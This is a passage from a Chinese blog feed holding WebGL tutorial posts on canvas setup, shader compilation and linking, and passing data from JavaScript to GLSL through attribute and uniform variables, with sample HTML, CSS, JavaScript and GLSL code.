class="lvl-3"><p>编译着色器</p></li></ol><p>通过gl.compileShader(shader)来编译着色器代码。GLSL代码在使用之前要编译成二进制的可执行格式，WebGL系统真正使用的是这种可执行格式。如果通过gl.shaderSource替换了一个着色器内的代码，需要再次进行编译。</p><p>通过gl.getShaderParameter(shader, pname)函数，将第二个参数指定为gl.COMPILE_STATUS，可以检查着色器编译成功与否。若编译失败，返回false。可再通过gl.getShaderInfoLog(shader)函数来获取编译错误的具体信息。</p><ol start="4"><li class="lvl-3"><p>创建程序对象</p></li></ol><p>通过gl.createProgram()来创建一个程序对象。可以通过gl.deleteProgram(program)来删除创建的程序对象。</p><ol start="5"><li class="lvl-3"><p>为程序对象分配着色器</p></li></ol><p>通过gl.attachShader(program, shader)来为程序对象分配着色器。为了WebGL系统的正常运行，顶点着色器和片元着色器都应该被分配给程序对象。通过gl.detachShader(program, shader)函数来解除分配给程序对象的着色器。</p><ol start="6"><li class="lvl-3"><p>连接程序对象</p></li></ol><p>通过gl.linkProgram()函数将程序对象中的顶点着色器和片元着色器连接起来。类似地，通过gl.getProgramParameter(shader, pname)设定第二个参数为gl.LINK_STATUS和gl.getProgramInfoLog(program)函数来获取编译成功与否和编译错误的信息。</p><ol start="7"><li class="lvl-3"><p>使用程序对象</p></li></ol><p>通过gl.useProgram(program)函数来指定WebGL系统使用的程序对象。</p><p>通过在绘制前准备多个程序对象，在绘制时根据需要切换使用的程序对象，就能达到使用多个着色器的效果。这也是为什么上一章我要把这一步从initShaders()里分离出来的原因。</p><p> </p><h2 id="从JS代码向着色器传递数据">从JS代码向着色器传递数据</h2><p>上一章虽然定义了着色器，但相关变量都是直接在着色器内定义的，缺乏可扩展性。如果要引入模型，数据势必要在JS代码与着色器代码间进行交互。</p><p> </p><h3 id="三种shader变量">三种shader变量</h3><p>如何将信息从JS代码传到GLSL代码？这将涉及GLSL的三种变量(实际上是存储限定符)——attribute, uniform以及varying。</p><p>attribute变量是只能在vertex shader中使用的变量，不能在fragment shader中声明和使用。一般attribute变量用来表示一些顶点的数据，如：顶点坐标，法线，纹理坐标，顶点颜色等。</p><p>uniform变量是外部程序传递给shader的变量，在shader内部，uniform变量不能被shader程序修改。如果uniform变量在vertex和fragment两者间声明一致，则它可以被vertex和fragment共享使用。uniform变量一般用来表示：变换矩阵，材质，光照参数和颜色等信息。</p><p>varying变量是vertex和fragment shader间作数据传递用的。一般vertex shader修改varying变量的值，然后fragment shader使用该varying变量的值。因此varying变量在vertex和fragment shader两者之间的声明必须是一致的。</p><p> </p><h3 id="获取来自JS的数据">获取来自JS的数据</h3><p>来看两段简单的GLSL代码：</p><pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token comment">//vertex shader</span><span class="token keyword">attribute</span> <span class="token keyword">vec4</span> a_Position<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    gl_Position <span class="token operator">=</span> a_Position<span class="token punctuation">;</span>    gl_PointSize <span class="token operator">=</span> <span class="token number">10.0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//fragment shader</span><span class="token keyword">precision</span> <span class="token keyword">mediump</span> <span class="token keyword">float</span><span class="token punctuation">;</span><span class="token keyword">uniform</span> <span class="token keyword">vec4</span> u_FragColor<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    gl_FragColor <span class="token operator">=</span> u_FragColor<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是写在两个着色器的代码。</p><p>要向a_Position和u_FragColor传送数据，首先要获取这两个变量在WebGL系统中的位置，然后再通过函数发送数据。写在JS中的代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//获取存储位置</span><span class="token keyword">var</span> a_Position <span class="token operator">=</span> gl<span class="token punctuation">.</span><span class="token function">getAttribLocation</span><span class="token punctuation">(</span>gl<span class="token punctuation">.</span>program<span class="token punctuation">,</span> <span class="token string">'a_Position'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u_FragColor <span class="token operator">=</span> gl<span class="token punctuation">.</span><span class="token function">getUniformLocation</span><span class="token punctuation">(</span>gl<span class="token punctuation">.</span>program<span class="token punctuation">,</span> <span class="token string">'u_FragColor'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传送数据</span>gl<span class="token punctuation">.</span><span class="token function">vertexAttrib3f</span><span class="token punctuation">(</span>a_Position<span class="token punctuation">,</span> xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> xy<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gl<span class="token punctuation">.</span><span class="token function">uniform4f</span><span class="token punctuation">(</span>u_FragColor<span class="token punctuation">,</span> rgba<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rgba<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rgba<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rgba<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attribute赋值同族函数：gl.vertexAttrib1f, gl.vertexAttrib2f, gl.vertexAttrib3f, gl.vertexAttrib4f</p><p>uniform赋值同族函数：gl.uniform1f, gl.uniform2f, gl.uniform3f, gl.uniform4f</p><p>数字表示传递的参数的个数。</p><p>赋值后调用drawArrays()函数，即可动态改变顶点状态后进行绘制。</p><p> </p><p>这章不提供代码。</p><p> </p><h2 id="参考资料">参考资料</h2><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea<br>[2] <a href="https://blog.csdn.net/Jackers679/article/details/6848085">OpenGL ES2.0 的三种变量类型</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(一) | Hello, WebGL.</title>
      <link href="/2020/01/20/webgl1/"/>
      <url>/2020/01/20/webgl1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这悲哀的山巅，请用你的眼泪诅咒我、祝福我，不要温和地走入那个良夜。</p></blockquote><span id="more"></span><p>作为与<a href="https://github.com/AshenAshes/WebGL-MidSummer_Night">项目</a>一致的记录而存在。</p><p>是对曾经没有时间完善的WebGL项目的追溯，也是一个重新学习原生WebGL的过程。</p><p>  </p><h2 id="创建与设置画布">创建与设置画布</h2><p>我们用H5新引入的<code>&lt;canvas&gt;</code>标签作为绘图区域，它允许JavaScript动态绘制图形。由于canvas是透明的，在canvas间加入的信息只会在不支持WebGL的浏览器上显示，这可以作为错误提示。</p><p>对canvas内容的操作与绘制将通过JavaScript代码来实现，我们可以用<code>&lt;script&gt;&lt;/script&gt;</code>标签引入对应的JS代码。</p><p>用body标签指定JS程序的入口。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- index.html --></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>WebGL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./lib/jquery-3.3.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./css/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- &lt;script type="text/javascript" src="./js/windowResize.js">&lt;/script> --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>canvas<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      Please use a browser that supports "canvas"    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./js/draw.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> </p><p>我们预想的canvas应该自适应撑满整个屏幕，曾经在写类似前端需求时碰到过一个问题，就是会有高度上的滚动条出现，为了解决这个问题，抄了一些网上的css，使canvas的宽度和高度都可以适应全屏幕。对了，为了代码的可阅读性，html文件在根目录，其他所有的css,js,之后的着色器、model等都将独立设置子目录。</p><p>css代码如下：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* style.css */</span><span class="token selector">html,body,canvas</span> <span class="token punctuation">&#123;</span>  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>  <span class="token property">font-family</span><span class="token punctuation">:</span> Monospace<span class="token punctuation">;</span>  <span class="token property">background-color</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span>  <span class="token property">color</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">*</span> <span class="token punctuation">&#123;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">canvas</span> <span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> </p><p>加入这段代码后，你会发现body所在的区域全都变成黑色了，并且没有滚动条出现。但当用F12开发者工具观察时，你会发现canvas所在区域的高度并没有占满整个屏幕。这时候我们需要用到JQuery来动态设置canvas的高度。注意，使用JQuery要引入JQuery文件，我把它放在了/lib文件夹里。</p><p>你可以选择监听窗口的大小变化然后实时刷新canvas的size，注意每次刷新后都会丢失canvas的内容，需要重新绘制。注释掉的windowResize.js即为动态刷新的代码，如下所示：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//windowResize.js</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>resizeCanvas<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">resizeCanvas</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">resizeCanvas</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"width"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerWidth<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"height"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> </p><p>不过我暂时没有想好把canvas和window一起重绘的代码放在哪里，所以这里我采用了只在window初始化的时候确定canvas的size，所以这段代码被放在了main的初始化阶段。和绘制的代码放在一起，便于我观察测试：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//draw.js</span><span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'canvas'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>canvas<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Failed to get the &lt;canvas> element'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//自适应一开始的页面大小</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"width"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerWidth<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"height"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> context <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">'2d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  context<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">'rgba(0, 0, 255, 1.0)'</span><span class="token punctuation">;</span>  context<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> </p><h2 id="尝试绘制">尝试绘制</h2><p>绘制主要通过js进行，代码已经在上面的draw.js里了。我们首先通过id获取canvas对象，但绘制并不是直接通过canvas对象进行的，而是由canvas提供的上下文对象(context)来进行的。getContext参数指定了绘制对象的类型是2d还是3d，这里我们测试画的是一个矩形，所以是2d对象。</p><p>fillStyle可以理解为画笔颜色，这里用的是Alpha=1.0的蓝色。RGB的范围都是0-255，alpha的范围是0-1.0。</p><p>关于WebGL的坐标系统，原点在屏幕左上角，x轴从左到右，y轴从上到下。fillRect方法前两个参数是矩形的左上角坐标，后两个参数对应矩形的x轴方向长度和y轴方向长度(即宽度和高度)。</p><p>绘制效果如下图所示：</p><p><img src="/2020/01/20/webgl1/1720266182444.png" alt=""></p><p>这只是一个尝试在canvas上绘制图形的过程，真正的WebGL编程远比这个繁琐。</p><h2 id="着色器相关">着色器相关</h2><h3 id="函数库">函数库</h3><p>注意，从这里开始我们将引入参考资料里的一些程序，这些程序大都是一些事先定义好的函数库，方便我们获取一些对象，隐去不同浏览器之间的差异，但是我们的主要编程部分仍然是遵循原生WebGL的主旨。</p><p>同时，为了避免以后不同函数库之间命名冲突的问题(曾经给我的CG大程造成了很大的麻烦)，我将建立自己的函数库，大致考虑分为两个，一个是WebGL-utils.js，注重于WebGL方面的初始化过程，另一个是math-utils.js，注重矩阵计算方面。有一个叫WebGL-debug.js的东西是用来显示debug信息的，这个是从参考资料代码里照搬的。</p><p> </p><h3 id="着色器">着色器</h3><p>着色器是WebGL最重要的概念之一，绘图过程必须用到着色器。WebGL需要两种着色器——顶点着色器(Vertex Shader)和片元着色器(Fragment Shader)，用GLSL语言编写。</p><p>顶点着色器是用来描述顶点特性(如位置、颜色等)的程序。片元着色器进行逐片元处理过程(如光照)。绘图的过程是，浏览器执行JS程序——JS执行WebGL相关方法——顶点着色器逐顶点操作，片元着色器逐片元操作——渲染到颜色缓冲区——显示在浏览器上。</p><p><img src="/2020/01/20/webgl1/1720266199134.png" alt=""></p><p>不过虽然着色器代码是用GLSL语言编写的，创建着色器对象的过程中，程序接收的必须是字符串类型的对象，下面将介绍三种在JS代码中插入GLSL代码并创建着色器的方式。</p><p> </p><h3 id="用字符串存储着色器">用字符串存储着色器</h3><p>在参考资料书中，用到的都是这一种。直接在js代码内用字符串变量存储GLSL代码。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Vertex shader program</span><span class="token keyword">var</span> <span class="token constant">VSHADER_SOURCE</span> <span class="token operator">=</span>   <span class="token string">'void main() &#123;\n'</span> <span class="token operator">+</span>  <span class="token string">'  gl_Position = vec4(0.0, 0.0, 0.0, 1.0);\n'</span> <span class="token operator">+</span> <span class="token comment">// Set the vertex coordinates of the point</span>  <span class="token string">'  gl_PointSize = 10.0;\n'</span> <span class="token operator">+</span>                    <span class="token comment">// Set the point size</span>  <span class="token string">'&#125;\n'</span><span class="token punctuation">;</span><span class="token comment">// Fragment shader program</span><span class="token keyword">var</span> <span class="token constant">FSHADER_SOURCE</span> <span class="token operator">=</span>  <span class="token string">'void main() &#123;\n'</span> <span class="token operator">+</span>  <span class="token string">'  gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);\n'</span> <span class="token operator">+</span> <span class="token comment">// Set the point color</span>  <span class="token string">'&#125;\n'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token operator">...</span>  <span class="token comment">// Initialize shaders</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">initShaders</span><span class="token punctuation">(</span>gl<span class="token punctuation">,</span> <span class="token constant">VSHADER_SOURCE</span><span class="token punctuation">,</span> <span class="token constant">FSHADER_SOURCE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Failed to intialize shaders.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>initShader()函数是函数库WebGL-utils.js中的一个函数，如果你对WebGL如何创建着色器的过程不感兴趣，你可以直接调用这个函数，忽略内部细节。注意第二第三个参数必须为字符串。</p><p>使用'\n'而不是直接用长字符串的原因是，这样做，当着色器内部出错时，就能获取出错的行号，对检查源代码错误很有帮助。</p><p>这种方法只适用于简单程序，书写很麻烦，创建和维护难度大。</p><p> </p><h3 id="内嵌于html代码中">内嵌于html代码中</h3><p>这种方法在网上的各种教程中很常见，通过设置<code>&lt;script&gt;</code>标签的type使得浏览器将内容视为数据块，不作为JS代码执行。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vertex-shader<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x-shader/x-vertex<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    gl_Position <span class="token operator">=</span> <span class="token function">vec4</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置坐标</span>    gl_PointSize <span class="token operator">=</span> <span class="token number">10.0</span><span class="token punctuation">;</span>  <span class="token comment">//设置尺寸</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fragment-shader<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x-shader/x-fragment<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    gl_FragColor <span class="token operator">=</span> <span class="token function">vec4</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//设置颜色</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在JS代码中还要将标签内容转为字符串，具体代码可以参考以下(这里的代码其实包含了创建着色器的内部细节，如果不想关心，可以将initShaders函数放到函数库里，传给函数的第二三个参数是着色器代码所在script标签的id)：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span>    program <span class="token operator">=</span> <span class="token function">initShaders</span><span class="token punctuation">(</span>gl<span class="token punctuation">,</span> <span class="token string">"vertex-shader"</span><span class="token punctuation">,</span> <span class="token string">"fragment-shader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gl<span class="token punctuation">.</span><span class="token function">useProgram</span><span class="token punctuation">(</span>program<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启用该shader程序对象 </span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">initShaders</span><span class="token punctuation">(</span> <span class="token parameter">gl<span class="token punctuation">,</span> vertexShaderId<span class="token punctuation">,</span> fragmentShaderId</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> vertShdr<span class="token punctuation">;</span>    <span class="token keyword">var</span> fragShdr<span class="token punctuation">;</span>    <span class="token keyword">var</span> vertElem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span> vertexShaderId <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>vertElem <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">alert</span><span class="token punctuation">(</span> <span class="token string">"Unable to load vertex shader "</span> <span class="token operator">+</span> vertexShaderId <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        vertShdr <span class="token operator">=</span> gl<span class="token punctuation">.</span><span class="token function">createShader</span><span class="token punctuation">(</span> gl<span class="token punctuation">.</span><span class="token constant">VERTEX_SHADER</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        gl<span class="token punctuation">.</span><span class="token function">shaderSource</span><span class="token punctuation">(</span> vertShdr<span class="token punctuation">,</span> vertElem<span class="token punctuation">.</span>text <span class="token punctuation">)</span><span class="token punctuation">;</span>        gl<span class="token punctuation">.</span><span class="token function">compileShader</span><span class="token punctuation">(</span> vertShdr <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>gl<span class="token punctuation">.</span><span class="token function">getShaderParameter</span><span class="token punctuation">(</span>vertShdr<span class="token punctuation">,</span> gl<span class="token punctuation">.</span><span class="token constant">COMPILE_STATUS</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token string">"Vertex shader failed to compile.  The error log is:"</span>          <span class="token operator">+</span> <span class="token string">"&lt;pre>"</span> <span class="token operator">+</span> gl<span class="token punctuation">.</span><span class="token function">getShaderInfoLog</span><span class="token punctuation">(</span> vertShdr <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span> 